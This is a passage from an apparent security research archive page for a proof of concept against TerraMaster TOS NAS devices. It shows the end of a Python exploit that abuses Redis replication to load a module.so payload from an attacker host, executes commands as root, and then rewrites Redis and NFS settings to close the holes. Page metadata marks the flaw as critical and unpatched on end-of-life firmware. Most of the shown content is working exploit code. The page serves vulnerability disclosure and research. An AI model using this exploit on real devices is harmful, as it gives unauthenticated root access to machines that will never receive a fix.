-</span></span><span class="line"><span class="cl">            <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;echo &#39;daemonize yes&#39; &gt;&gt; /etc/redis.conf&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">good</span><span class="p">(</span><span class="s2">&#34;daemonize yes set&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">good</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;redis.conf daemonize verified: </span><span class="si">{</span><span class="n">daemonize</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- safety: confirm init script is the vulnerable desh symlink ---</span>
-</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;readlink /etc/init.d/redis 2&gt;/dev/null || echo NOT_A_SYMLINK&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;/usr/sbin/desh&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">warn</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/etc/init.d/redis is not the expected desh symlink (</span><span class="si">{</span><span class="n">target</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">warn</span><span class="p">(</span><span class="s2">&#34;Skipping init script replacement — may already be patched&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- replace the symlink with a real init script ---</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;cp -a /etc/init.d/redis /etc/init.d/redis.bak.pre-patch 2&gt;/dev/null; true&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;rm -f /etc/init.d/redis&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">write_remote</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;/etc/init.d/redis&#34;</span><span class="p">,</span> <span class="n">REDIS_INIT</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s2">&#34;755&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;head -2 /etc/init.d/redis&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;#!/bin/sh&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">head</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bail</span><span class="p">(</span><span class="s2">&#34;Failed to write /etc/init.d/redis&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">good</span><span class="p">(</span><span class="s2">&#34;Patched /etc/init.d/redis — will use /etc/redis.conf on restart&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">patch_nfs</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Replace no_root_squash with root_squash in /etc/exports and re-export.&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">exports</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;cat /etc/exports 2&gt;/dev/null&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">exports</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">        <span class="n">warn</span><span class="p">(</span><span class="s2">&#34;/etc/exports is empty or missing — skipping NFS patch&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;no_root_squash&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">exports</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">warn</span><span class="p">(</span><span class="s2">&#34;no_root_squash not found in /etc/exports — already fixed or not present&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Current /etc/exports:</span><span class="se">\n</span><span class="si">{</span><span class="n">exports</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;cp /etc/exports /etc/exports.bak.pre-patch&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;sed -i &#39;s/no_root_squash/root_squash/g&#39; /etc/exports&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">patched</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;cat /etc/exports&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;no_root_squash&#34;</span> <span class="ow">in</span> <span class="n">patched</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bail</span><span class="p">(</span><span class="s2">&#34;sed replacement failed on /etc/exports&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">good</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Patched /etc/exports:</span><span class="se">\n</span><span class="si">{</span><span class="n">patched</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;exportfs -ra 2&gt;/dev/null; true&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">good</span><span class="p">(</span><span class="s2">&#34;NFS re-exported with root_squash&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
-</span></span><span class="line"><span class="cl">        <span class="n">description</span><span class="o">=</span><span class="s2">&#34;Exploit TerraMaster TOS Redis RCE to patch both bugs&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;host&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;NAS IP address&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--lhost&#34;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">                        <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Attacker IP reachable from target (default: auto)&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--no-restart&#34;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s2">&#34;store_true&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">                        <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Skip Redis restart after patching&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">poc</span><span class="o">.</span><span class="n">_progress</span> <span class="o">=</span> <span class="n">Progress</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- load the .so payload ---</span>
-</span></span><span class="line"><span class="cl">    <span class="n">module_so</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">SCRIPT_DIR</span><span class="p">,</span> <span class="s2">&#34;rce&#34;</span><span class="p">,</span> <span class="s2">&#34;module.so&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">module_so</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bail</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">module_so</span><span class="si">}</span><span class="s2"> not found — run &#39;make&#39; in rce/&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">module_so</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Loaded </span><span class="si">{</span><span class="n">module_so</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes)&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- phase 1: exploit the RCE ---</span>
-</span></span><span class="line"><span class="cl">    <span class="n">module_path</span> <span class="o">=</span> <span class="n">deliver_module</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">lhost</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">lhost</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">redis_load_module</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">module_path</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">whoami</span> <span class="o">=</span> <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;uid=0&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">whoami</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bail</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Not root: </span><span class="si">{</span><span class="n">whoami</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">good</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Root: </span><span class="si">{</span><span class="n">whoami</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- phase 2: patch both bugs ---</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">patch_redis</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">patch_nfs</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">SystemExit</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">raise</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">warn</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Patch failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;rm -f </span><span class="si">{</span><span class="n">module_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">redis_cmd</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;MODULE&#34;</span><span class="p">,</span> <span class="s2">&#34;UNLOAD&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># --- phase 3: cleanup exploit artifacts ---</span>
-</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="s2">&#34;Removing exploit module from disk&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;rm -f </span><span class="si">{</span><span class="n">module_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">no_restart</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">(</span><span class="s2">&#34;Scheduling Redis restart in 2s&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">rexec</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;nohup sh -c &#39;sleep 2; /etc/init.d/redis restart&#39; &gt;/dev/null 2&gt;&amp;1 &amp;&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">good</span><span class="p">(</span><span class="s2">&#34;Redis will restart bound to 127.0.0.1 in ~2 seconds&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">warn</span><span class="p">(</span><span class="s2">&#34;Skipped restart — run &#39;/etc/init.d/redis restart&#39; to apply Redis bind fix&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">redis_cmd</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;MODULE&#34;</span><span class="p">,</span> <span class="s2">&#34;UNLOAD&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="ne">BrokenPipeError</span><span class="p">,</span> <span class="ne">OSError</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">good</span><span class="p">(</span><span class="s2">&#34;Both vulnerabilities patched&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
-      </div>
-
-    </div>
-
-    
-    <nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800">
-      
-        <a href="/pocs/web/2026-05-17_apache-httpd-mod-http2-double-free/" class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800">
-          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in network</span>
-          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Apache httpd mod_http2 Double-Free Pre-Auth RCE - CVE-2026-23918</span>
-        </a>
-      
-      
-        <a href="/pocs/binary/2026-05-18_dirtydecrypt/" class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800">
-          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in network →</span>
-          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">DirtyDecrypt / DirtyCBC — rxgk Page-Cache Write (Dirty Pipe Variant)</span>
-        </a>
-      
-    </nav>
-  </div>
-
-  
-  <aside class="hidden lg:order-2 lg:block">
-    <div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40">
-  
-
-  <dl class="space-y-3 font-mono text-xs">
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Severity</dt>
-      <dd class="mt-1"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400">
-  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical
-</span>
-</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">CVE</dt>
-      <dd class="mt-1 text-emerald-600 dark:text-emerald-400">N/A (vendor confirmed TOS4 is EOL; no fix planned)</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Category</dt>
-      <dd class="mt-1">
-        <a href="/pocs/network/" class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a>
-      </dd>
-    </div>
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">TerraMaster TOS3_A1.0 4.2.41, Redis 4.0.10</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">TOS3_A1.0 4.2.41 (RTD1296/AArch64); other builds likely affected if same init path</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-18</dd>
-    </div>
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt>
-      <dd class="mt-1">
-        <span class="text-amber-600 dark:text-amber-400">unpatched</span>
-      </dd>
-    </div>
-  </dl>
-
-  
-  <div>
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p>
-    <div class="mt-2 flex flex-wrap gap-1.5">
-      
-      <a href="/tags/rce/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
-      
-      <a href="/tags/unauthenticated/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
-      
-      <a href="/tags/redis/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Redis</a>
-      
-      <a href="/tags/terramaster/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#TerraMaster</a>
-      
-      <a href="/tags/nas/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#NAS</a>
-      
-      <a href="/tags/aarch64/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#AArch64</a>
-      
-      <a href="/tags/root/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#root</a>
-      
-      <a href="/tags/module-loading/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#module-loading</a>
-      
-      <a href="/tags/replication-abuse/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#replication-abuse</a>
-      
-      <a href="/tags/nfs/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#NFS</a>
-      
-      <a href="/tags/no_root_squash/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#no_root_squash</a>
-      
-      <a href="/tags/lpe/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#LPE</a>
-      
-      <a href="/tags/network/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#network</a>
-      
-    </div>
-  </div>
-  
-
-  
-  <div>
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p>
-    <ul class="mt-2 space-y-1.5">
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://github.com/v12-security/pocs" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/v12-security/pocs</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://redis.io/commands/module-loadex/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://redis.io/commands/module-loadex/</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://redis.io/docs/management/replication/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://redis.io/docs/management/replication/</a>
-      </li>
-      
-    </ul>
-  </div>
-  <div class="border-t border-zinc-200 pt-4 dark:border-zinc-800">
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p>
-    <a href="https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-05-18_tossup-terramaster-redis-rce/" target="_blank" rel="noopener noreferrer"
-       class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">
-      <svg class="h-3.5 w-3.5 flex-shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
-      intelseclab/poc-archive
-    </a>
-  </div>
-</div>
-</div>
-  </aside>
-</article>
-
-  </main>
-  <footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800">
-  <div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500">
-    <p class="font-mono">
